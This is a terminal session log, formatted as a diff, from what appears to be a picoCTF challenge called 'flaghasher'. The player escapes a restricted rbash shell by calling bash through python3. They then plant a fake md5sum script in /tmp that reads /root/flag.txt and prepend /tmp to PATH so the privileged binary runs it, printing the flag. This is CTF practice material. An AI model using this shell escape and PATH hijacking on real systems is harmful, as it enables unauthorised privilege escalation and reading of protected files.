@@ -1,0 +1,29 @@
+ctf-player@pico-chall$ alias md5sum='cat /root/flag.txt'
+ctf-player@pico-chall$ flaghasher
+Computing the MD5 hash of /root/flag.txt.... 
+
+71c3e1587669516d6e4e337cad61165f  /root/flag.txt
+ctf-player@pico-chall$ objdump -d flaghasher | grep -A 30 "<main>:"
+objdump: 'flaghasher': No such file
+ctf-player@pico-chall$ python3 -c "import hashlib; print(hashlib.md5(b'1337').hexdigest())"
+e48e13207341b6bffb7fb1622282247b
+ctf-player@pico-chall$ python3 -c "import hashlib; print(hashlib.md5(b'root').hexdigest())"
+63a9f0ea7bb98050796b649e85481845
+ctf-player@pico-chall$ vi
+-rbash: vi: command not found
+ctf-player@pico-chall$ vim
+-rbash: vim: command not found
+ctf-player@pico-chall$ python3 -c 'import os; os.system("/bin/bash")'
+ctf-player@challenge:~$ cd /tmp
+ctf-player@challenge:/tmp$ echo -e '#!/bin/bash\ncat /root/flag.txt' > md5sum
+ctf-player@challenge:/tmp$ chmod +x md5sum
+ctf-player@challenge:/tmp$ find /home -name flaghasher 2>/dev/null
+ctf-player@challenge:/tmp$ PATH=.:$PATH /home/ctf-player/flaghasher
+bash: /home/ctf-player/flaghasher: No such file or directory
+ctf-player@challenge:/tmp$ find / -name flaghasher 2>/dev/null
+/usr/local/bin/flaghasher
+ctf-player@challenge:/tmp$ PATH=/tmp:$PATH /usr/local/bin/flaghasher
+Computing the MD5 hash of /root/flag.txt.... 
+
+picoCTF{Co-@utH0r_Of_Sy5tem_b!n@riEs_4b31549c}ctf-player@challenge:/tmp$ Connection to rescued-float.picoctf.net closed by remote host.
+Connection to rescued-float.picoctf.net closed.
